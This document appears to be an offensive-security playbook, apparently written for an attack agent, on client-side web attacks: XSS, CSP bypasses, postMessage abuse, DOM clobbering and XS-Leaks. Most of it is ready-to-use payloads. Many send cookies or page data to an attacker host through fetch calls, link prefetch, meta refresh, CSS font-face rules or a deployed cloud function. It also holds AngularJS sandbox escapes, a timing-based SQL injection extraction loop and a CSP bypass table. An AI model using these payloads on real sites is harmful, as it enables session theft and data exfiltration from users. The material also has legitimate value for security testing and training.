# Client-Side Attacks (XSS, CSP Bypass, DOM, PostMessage, XS-Leak)

## Trigger

Load when you see:

- Reflected or stored user input in HTML without proper escaping
- CSP headers: `Content-Security-Policy` in response headers
- `postMessage` event listeners in JavaScript
- jQuery `$(location.hash)` or `$()` with user-controlled input
- AngularJS 1.x `ng-app` directives (sandbox escape)
- Client-side frameworks with HTML attributes as code: Alpine.js (`x-`), Hyperscript (`_=`), htmx (`hx-`)
- URL fragment (#) used for routing or DOM selection
- Hidden DOM elements with sensitive data
- Admin bot visiting user-supplied URLs
- DOMPurify or similar sanitizers on the front end

## Attack Surface

- User input reflected without sanitization (XSS)
- CSP with dangerous bypass vectors (JSONP endpoints, CDN allowlists, missing base-uri)
- postMessage listeners without origin validation or with `*` targetOrigin
- DOM clobbering via `id`/`name` attributes on form/iframe/anchor elements
- Client-side path traversal (CSPT) via fetch URL construction from user input
- Cache poisoning via unkeyed headers (X-Forwarded-Host)
- `javascript:` URL scheme accepted by admin bots
- Cross-origin data leakage via timing or CSS (XS-Leak)

## Decision Tree

1. Identify user input points reflected in HTML, JS, or URL
2. Test XSS: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
3. If CSP present, analyze: `script-src`, `base-uri`, `object-src` directives
4. If CSP blocks inline scripts, try CSP bypasses (JSONP, CDN, base tag, DOM clobbering)
5. Check postMessage listeners: `window.addEventListener('message', ...)`
6. Check for DOM clobbering vectors: `id` or `name` attributes with predictable values
7. Check admin bot URL validation: does it accept `javascript:` or `data:` URLs?
8. Check for XS-Leak primitives: timing oracles via image loading, CSS selector leaks

## Techniques

### Basic XSS Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

### XSS Filter Bypass

```html
<ScRiPt>alert(1)</ScRiPt>           <!-- Case mixing -->
<script>alert`1`</script>           <!-- Template literals -->
<img src=x onerror=alert&#40;1&#41;>  <!-- HTML entities -->
<svg/onload=alert(1)>               <!-- No space between tag and attribute -->
<a href="javascript:alert(1)">x</a> <!-- Pseudo-protocol -->
```

### Unicode Case Folding XSS Bypass

When server-side sanitizer uses ASCII-only regex but downstream applies Unicode case folding:

```html
<!-- Latin Long S (U+017F) folds to 's' -->
<ſcript>location='http://attacker.com/?'+document.cookie</ſcript>
<!-- Other folding pairs: ı (U+0131) -> i, K (U+212A) -> k -->
```

### CSP Bypass via base Tag Hijacking

When CSP has `script-src 'nonce-xxx'` but MISSING `base-uri`:

```html
<!-- Inject before a nonced script that loads from relative URL -->
<base href="http://attacker.com/">
<script nonce="abc123" src="test.js"></script>
<!-- test.js resolves to http://attacker.com/test.js with valid nonce -->
```

### CSP Bypass via CDN-Whitelisted Behavioral Framework

When CSP allows `cdnjs.cloudflare.com`:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.12/hyperscript.min.js"></script>
<div _="on load fetch '/api/token' then put document.cookie into its body"></div>
```

Alpine.js variant (also works):

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.13.3/cdn.min.js"></script>
<div x-data x-init="fetch('/api/token').then(r=>r.text()).then(t=>fetch('http://attacker.com/?t='+t))"></div>
```

### CSP Bypass via link prefetch (Scriptless Exfiltration)

```html
<link rel="prefetch" href="http://attacker.com/steal?data=EXFILTRATED">
<meta http-equiv="refresh" content="0; url=http://attacker.com/steal?data=EXFILTRATED">
```

### CSP Bypass via Cloud Function Whitelisted Domain

When CSP allows `*.cloudfunctions.net` or `*.us-central1.run.app`:

```python
# Deploy this as a Google Cloud Function
def serveIt(request):
    js = """
    fetch(location.origin + '/admin/secret')
      .then(r => r.text())
      .then(d => fetch('http://attacker.com/?d=' + encodeURIComponent(d)));
    """
    return (js, 200, {'Content-Type': 'application/javascript'})
```

### postMessage Null Origin Bypass via data: URI Iframe

```html
<iframe src="data:text/html,<script>
var w = window.open('http://target/page');
setTimeout(function(){
    w.postMessage({type:'audio', details:{
        sender_username:'<img src=x onerror=fetch(`http://attacker.com/`+document.cookie)>'}
    }, '*');
}, 1000);
</script>"></iframe>

<!-- Sandboxed iframe also produces null origin -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
parent.postMessage({type:'audio', details:{
    sender_username:'<img src=x onerror=fetch(`http://attacker.com/`+document.cookie)>'}
}, '*');
</script>"></iframe>
```

### DOM Clobbering

```html
<form id="config"><input name="canAdminVerify" value="1"></form>
<!-- Makes window.config.canAdminVerify truthy, bypassing JS security checks -->

<form id="credentials">
  <a name="apiKey" href="http://attacker-key">Clobbered API Key</a>
</form>
```

### jQuery DOM XSS via Hashchange

When vulnerable code uses `$(location.hash)`:

```html
<iframe src="http://vulnerable.com/#"
  onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

### AngularJS 1.x Sandbox Escape

```html
<!-- Version 1.5.x: override charAt with join -->
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)')}}

<!-- Version 1.4.x -->
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}
```

### Chrome Unicode URL Normalization Bypass

Chrome normalizes fullwidth Unicode to ASCII (IDNA/punycode). Bypass length checks:

```python
# Fullwidth Latin chars (U+FF41-U+FF5A) normalize to a-z
url = "http://eｘample.com/payload"
# Chrome normalizes to http://example.com/payload
```

### XS-Leak via Image Load Timing + GraphQL CSRF

```javascript
// Admin bot visits attacker page -> redirect via <meta> -> attacker page
// Attacker JavaScript makes cross-origin GET requests to localhost GraphQL
// Timing-based SQLi via image error timing

const imageLoadTime = (src) => {
    return new Promise((resolve) => {
        let start = performance.now();
        const img = new Image();
        img.onerror = () => resolve(performance.now() - start);
        img.src = src;
    });
};

// Binary search extraction using SLEEP(1) timing oracle
for (let pos = 1; ; pos++) {
    for (let c of charset) {
        let sql = `query{RansomChat(enc_id:"123' and (select sleep(1) from dual where
            BINARY(SUBSTRING((select password from users),${pos},1))='${c}')-- -")
            {id}}}`;
        let delay = await imageLoadTime('http://127.0.0.1:1337/graphql?' + encodeURIComponent(sql));
        if (delay >= 1000) { flag += c; break; }
    }
}
```

### CSS @font-face Unicode Range Exfiltration

Trigger font fetches for specific characters present in the target element:

```css
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=a'); unicode-range: U+0061; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=b'); unicode-range: U+0062; }
/* One @font-face per character in target charset */
.target { font-family: exfil; }
```

### Cross-Origin XSS via Shared Parent Domain Cookie Injection

```javascript
// On attacker-accessible subdomain: set cookie for shared parent domain
document.cookie = 'username=<script src=//attacker.com/payload.js></script>; path=/; domain=.parent.invalid;';
window.top.location = 'http://admin.parent.invalid:8000';
```

### XSS via Referer Header Injection

```python
# Find page reflecting Referer into HTML without sanitization
payload = "javascript:fetch('http://attacker.com/?'+document.cookie)"
requests.get("http://target/page", headers={"Referer": payload})
```

### Client-Side Path Traversal (CSPT)

```javascript
// Vulnerable: const profileId = urlParams.get("id");
// fetch("/log/" + profileId, { method: "POST", body: JSON.stringify({...}) });

// Exploit: /user/profile?id=../admin/addAdmin
// -> fetches /admin/addAdmin with attacker-controlled POST body (CSRF-like)

// Parameter pollution: /user/profile?id=1&id=../admin/addAdmin
// Backend uses first, frontend uses last
```

## Bypass

| Block | Bypass |
|-------|--------|
| CSP `script-src 'self'` | Same-origin script gadget (JSONP, CORS endpoint with user-controlled Content-Type) |
| CSP `nonce-xxx` | base tag hijacking (missing `base-uri` directive) |
| CSP `*.cloudfront.net` | Deploy a malicious script to CloudFront |
| CSP blocks inline scripts | Behavioral frameworks (Alpine, Hyperscript, htmx) from CDN |
| postMessage origin check | data: URI iframe (origin=null), sandboxed iframe |
| HTML sanitizer (DOMPurify) | Bypass via trusted backend autosave route (bypass DOMPurify, POST directly) |
| `script-src` blocks remote JS | `<link rel="prefetch">`, `<meta refresh>` for scriptless exfiltration |
| Admin bot URL validation | `javascript:` URLs pass `new URL()` syntax validation |
| XSS filter strips dots | Decimal IP, bracket notation: `document["cookie"]` |

## Verification

- XSS: `alert(document.domain)` or `fetch('http://oob.burpcollaborator.net/?c='+document.cookie)`
- CSP bypass: demonstrate JavaScript execution despite CSP restrictions
- postMessage: receive user data on attacker-controlled endpoint
- XS-Leak: prove character-by-character extraction with at least 3 characters matched

## Pitfalls

- CSP is a defense-in-depth mechanism, not a replacement for server-side output encoding.
- `new URL()` validates syntax, NOT security. It does NOT reject `javascript:`, `data:`, or `file:`.
- jQuery `$(location.hash)` is both a DOM XSS sink AND a CSS selector timing oracle.
- postMessage `event.origin === null` should be explicitly rejected. `!event.origin` is not sufficient.
- DOMPurify bypasses targeting backend trust boundaries are common -- the frontend sanitizes, the backend trusts the autosave data.
- GraphQL GET requests bypass CORS preflight entirely (`new Image().src` triggers a simple GET).
- CSS exfiltration works under strict CSP because `style-src` is often more permissive than `script-src`.
- Behavioral framework attributes (`_=`, `x-data`, `hx-get`) are invisible to most sanitizers.
